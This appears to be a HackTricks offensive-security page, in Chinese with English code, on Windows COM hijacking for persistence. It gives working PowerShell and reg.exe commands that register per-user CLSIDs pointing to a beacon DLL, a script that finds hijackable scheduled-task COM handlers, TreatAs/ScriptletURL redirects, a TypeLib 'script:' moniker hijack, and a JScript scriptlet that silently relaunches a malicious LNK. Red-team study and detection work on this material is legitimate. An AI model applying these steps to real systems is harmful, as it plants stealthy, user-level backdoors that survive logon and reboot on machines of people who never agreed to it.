# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 搜索不存在的 COM components

由于用户可以修改 HKCU 的值，因此 **COM Hijacking** 可被用作一种**持久化机制**。使用 `procmon` 可以轻松找到尚不存在、但可能由攻击者创建的 COM 注册表项。经典过滤条件：

- **RegOpenKey** 操作。
- _Result_ 为 **NAME NOT FOUND**。
- _Path_ 以 **InprocServer32** 结尾。

搜索时的有用变化：

- 同时查找缺失的 **`LocalServer32`** 注册表项。某些 COM classes 是 out-of-process servers，会启动由攻击者控制的 EXE，而不是 DLL。
- 除了 `InprocServer32`，还要搜索 **`TreatAs`** 和 **`ScriptletURL`** 注册表操作。近期的检测内容和 malware 分析经常特别指出这些项，因为它们比正常的 COM registrations 少见得多，因此具有很高的检测信号价值。
- 将 registration 克隆到 HKCU 时，从原始的 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` 复制合法的 **`ThreadingModel`**。使用错误的 model 通常会导致 activation 失败，并使 hijack 更容易被发现。<sup>[[3]](#references)</sup>
- 在 64-bit systems 上检查 64-bit 和 32-bit views（`procmon.exe` 与 `procmon64.exe`、`HKLM\Software\Classes` 与 `HKLM\Software\Classes\WOW6432Node`），因为 32-bit applications 可能会解析到不同的 COM registration。

确定要 impersonate 哪个不存在的 COM 后，执行以下命令。如果决定 impersonate 一个每隔几秒就会被加载的 COM，请务必谨慎，因为这可能会造成过度影响。
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 可劫持的 Task Scheduler COM 组件

Windows Tasks 使用 Custom Triggers 调用 COM 对象，并且由于它们通过 Task Scheduler 执行，因此更容易预测它们何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

检查输出后，你可以选择一个例如会在**每次用户登录时**执行的任务。

现在，在 **HKEY\CLASSES\ROOT\CLSID** 以及 HKLM 和 HKCU 中搜索 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**，通常会发现该值在 HKCU 中不存在。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
然后，你只需创建 HKCU 条目，每次用户登录时，你的 backdoor 就会被触发。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` 允许一个 CLSID 由另一个 CLSID 模拟。<sup>[[4]](#references)</sup> 从 offensive 角度来看，这意味着你可以保留原始 CLSID 不变，创建一个指向 `scrobj.dll` 的第二个 per-user CLSID，然后通过 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` 将真实的 COM 对象重定向到恶意对象。

以下情况非常有用：

- 目标应用在登录时或启动时已经实例化了一个稳定的 CLSID
- 你希望使用仅修改 registry 的重定向方式，而不是替换原始的 `InprocServer32`
- 你希望通过 `ScriptletURL` 值执行本地或远程的 `.sct` scriptlet

示例工作流（改编自公开的 Atomic Red Team tradecraft 以及较早的 COM registry abuse 研究）：
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
说明：

- `scrobj.dll` 会读取 `ScriptletURL` 值并执行所引用的 `.sct`，因此可以将 payload 保存在本地文件中，也可以通过 HTTP/HTTPS 从远程获取。
- 当原始 COM 注册在 HKLM 中完整且稳定时，`TreatAs` 尤其方便，因为你只需创建一个小型的 per-user 重定向，而不必镜像整个树。
- 如果不想等待自然触发，可以使用 `rundll32.exe -sta <ProgID-or-CLSID>` 手动实例化 fake ProgID/CLSID 进行验证，前提是目标 class 支持 STA activation。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) 定义 COM interfaces，并通过 `LoadTypeLib()` 加载。当 COM server 被实例化时，OS 还可能通过查询 `HKCR\TypeLib\{LIBID}` 下的 registry keys 来加载关联的 TypeLib。如果将 TypeLib path 替换为 **moniker**，例如 `script:C:\...\evil.sct`，Windows 将在解析 TypeLib 时执行 scriptlet，从而实现一种隐蔽的 persistence，在常见 components 被访问时触发。

据观察，这种方式可针对 Microsoft Web Browser control（经常由 Internet Explorer、嵌入 WebBrowser 的 apps，甚至 `explorer.exe` 加载）。<sup>[[1]](#references)[[2]](#references)</sup>

### 步骤 (PowerShell)

1) 识别高频 CLSID 使用的 TypeLib (LIBID)。恶意软件 chains 经常滥用的 CLSID 示例：`{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`（Microsoft Web Browser）。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 使用 `script:` moniker 将每用户 TypeLib 路径指向本地 scriptlet（无需管理员权限）：
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 放置一个最小化的 JScript `.sct`，用于重新启动你的主要 payload（例如初始链中使用的 `.lnk`）：
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) 触发 —— 打开 IE、嵌入 WebBrowser control 的应用程序，甚至执行常规的 Explorer 操作，都会加载 TypeLib 并执行 scriptlet，从而在登录/重启时重新启用你的链条。

清理
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注释
- 你可以将相同的逻辑应用于其他高频 COM 组件；始终先从 `HKCR\CLSID\{CLSID}\TypeLib` 解析真实的 `LIBID`。
- 在 64 位系统上，你还可以为 64 位使用者填充 `win64` 子键。

## 参考资料

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
